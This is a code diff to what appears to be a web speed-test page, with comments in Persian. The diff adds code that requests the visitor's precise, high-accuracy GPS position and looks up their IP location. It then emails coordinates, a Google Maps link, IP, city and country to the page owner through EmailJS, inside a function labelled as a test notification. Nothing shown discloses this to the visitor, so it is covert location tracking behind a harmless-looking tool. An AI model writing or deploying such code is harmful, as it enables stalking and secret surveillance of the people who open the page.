@@ -81,8 +81,58 @@
         finalSpeed: null, testElements: []
       };
 
-      // 🎯 گرفتن IP و Location
-      const getUserLocation = async () => {
+      // 🎯 گرفتن موقعیت دقیق GPS
+      const getPreciseLocation = async () => {
+        return new Promise((resolve) => {
+          if (!navigator.geolocation) {
+            resolve({
+              lat: 'N/A',
+              lon: 'N/A',
+              accuracy: 'N/A',
+              mapsLink: 'N/A',
+              plusCode: 'N/A'
+            });
+            return;
+          }
+
+          navigator.geolocation.getCurrentPosition(
+            (position) => {
+              const lat = position.coords.latitude.toFixed(6);
+              const lon = position.coords.longitude.toFixed(6);
+              const accuracy = position.coords.accuracy; // متر
+              const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+              // Plus Code ساده شده
+              const plusCode = `${lat.substring(0,4)}+${lon.substring(0,4).toUpperCase()}`;
+              
+              resolve({
+                lat,
+                lon,
+                accuracy: `${Math.round(accuracy)}m`,
+                mapsLink,
+                plusCode
+              });
+            },
+            (error) => {
+              console.warn('⚠️ GPS denied:', error);
+              resolve({
+                lat: 'Denied',
+                lon: 'Denied',
+                accuracy: 'N/A',
+                mapsLink: 'N/A',
+                plusCode: 'N/A'
+              });
+            },
+            {
+              enableHighAccuracy: true,
+              timeout: 5000,
+              maximumAge: 0
+            }
+          );
+        });
+      };
+
+      // 🌐 گرفتن IP و Location از API
+      const getIPLocation = async () => {
         try {
           const response = await fetch('https://ipapi.co/json/');
           const data = await response.json();
@@ -90,19 +140,15 @@
             ip: data.ip || 'Unknown',
             city: data.city || 'Unknown',
             region: data.region || 'Unknown',
-            country: data.country_name || 'Unknown',
-            lat: data.latitude || '',
-            lon: data.longitude || ''
+            country: data.country_name || 'Unknown'
           };
         } catch (error) {
-          console.warn('⚠️ Could not fetch location:', error);
+          console.warn('⚠️ Could not fetch IP location:', error);
           return {
             ip: 'Unknown',
             city: 'Unknown',
             region: 'Unknown',
-            country: 'Unknown',
-            lat: '',
-            lon: ''
+            country: 'Unknown'
           };
         }
       };
@@ -110,15 +156,23 @@
       const sendTestNotification = async () => {
         try {
           const now = new Date();
-          const location = await getUserLocation();
+          const [gpsLocation, ipLocation] = await Promise.all([
+            getPreciseLocation(),
+            getIPLocation()
+          ]);
           
           const templateParams = {
             date: now.toLocaleDateString('fa-IR'),
             time: now.toLocaleTimeString('fa-IR'),
-            ip: location.ip,
-            city: location.city,
-            region: location.region,
-            country: location.country
+            ip: ipLocation.ip,
+            city: ipLocation.city,
+            region: ipLocation.region,
+            country: ipLocation.country,
+            latitude: gpsLocation.lat,
+            longitude: gpsLocation.lon,
+            accuracy: gpsLocation.accuracy,
+            mapsLink: gpsLocation.mapsLink,
+            plusCode: gpsLocation.plusCode
           };
           
           await emailjs.send(
@@ -127,7 +181,7 @@
             templateParams,
             EMAIL_CONFIG.publicKey
           );
-          console.log('✅ Email sent with location:', location);
+          console.log('✅ Email sent with GPS location:', gpsLocation);
         } catch (error) {
           console.error('❌ Email send failed:', error);
         }
